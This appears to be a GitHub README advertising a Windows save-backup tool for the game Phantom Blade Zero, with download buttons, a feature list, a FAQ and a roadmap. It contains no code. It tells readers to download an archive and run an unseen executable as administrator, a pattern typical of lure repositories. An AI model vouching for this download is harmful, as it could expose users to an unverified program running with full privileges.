# Phantom Blade Zero Save Manager

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Downloads](https://img.shields.io/badge/Downloads-New-blue?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Automatic save backup utility for Phantom Blade Zero — protects progress before boss fights, crashes, and updates.

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/morningfalconglimpse/phantom-blade-zero-save-manager-2026/releases/tag/1.0.0)

</div>

---

## ⚡ At a Glance

| | |
|---|---|
| **What it is** | Save backup utility for Phantom Blade Zero |
| **Who it's for** | Players who don't want to lose progress to crashes or bad boss attempts |
| **What it solves** | No built-in save backup, punishing difficulty, update risks |
| **How it works** | Copies save files before each launch, keeps timestamped backups, one-click restore |

---

## 🔥 Why This Exists

Phantom Blade Zero launches on October 29, 2026. It's a soulslike — punishing combat, demanding bosses, and a story about a swordsman with 66 days to live. The game doesn't include a built-in save backup system.

If the game crashes, if a patch corrupts your save, or if you just want to undo a boss attempt that went wrong, you're out of luck. This utility solves that. It runs in the background, copies your save files before every session, and lets you restore any previous state with one click.

---

## 🧩 What It Does

### Auto Backup
- Copies save files to a timestamped folder before every launch
- Keeps the last 10 backups by default (configurable)
- Works with Steam and standalone installations

### One-Click Restore
- Browse all backups in a simple list
- Restore any previous save with a single click
- Confirmation prompt prevents accidental overwrites

### Crash Detection
- Monitors the game process
- If it exits unexpectedly, flags the session
- Suggests restoring the last backup on next launch

### Update Protection
- Creates an extra backup before game updates
- Keeps update backups separate from regular ones
- Helps recover if a patch breaks existing saves

---

## 💻 System Requirements

| Component | Minimum | Recommended |
| :--- | :--- | :--- |
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 50 MB | 100 MB |
| **Runtime** | .NET 8.0 (bundled) | .NET 8.0 |
| **Game** | Phantom Blade Zero (Steam/standalone) | Latest patch |
| **Permissions** | Administrator | Administrator |

---

## 🚀 Quick Start

1. **Download** the archive using the button above
2. **Extract** with 7-Zip or WinRAR
3. **Run** `PBZSaveManager.exe` as administrator
4. **Select** your save folder (auto-detected for Steam)
5. **Enable** auto-backup and set retention count
6. **Play** — backups happen automatically before each launch

---

## ❓ FAQ

**Does this modify the game?**
No — it only copies save files. It doesn't touch game files, memory, or anti-cheat.

**Will I get banned?**
Phantom Blade Zero is a single-player game. There is no online component and no anti-cheat. No ban risk.

**Where are the saves stored?**
Steam version: `%AppData%\Local\PhantomBladeZero\Saved\SaveGames\`. The utility auto-detects this path.

**How many backups does it keep?**
10 by default. You can change this in settings.

**Does it work with the demo?**
The demo uses a different save path. Support for the demo is planned for a future update.

**How do I uninstall?**
Run `PBZSaveManager.exe --uninstall` — it removes the utility and its registry entries. Backups remain in their folder.

---

## 🗺️ Roadmap

- [ ] Demo save path support
- [ ] Cloud backup integration (OneDrive, Google Drive)
- [ ] Save file integrity checker
- [ ] Multi-language support

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download for Windows](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2EA043?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/morningfalconglimpse/phantom-blade-zero-save-manager-2026/releases/tag/1.0.0)

**Version 1.0.0** — Save Protection · Auto Backup · MIT

</div>
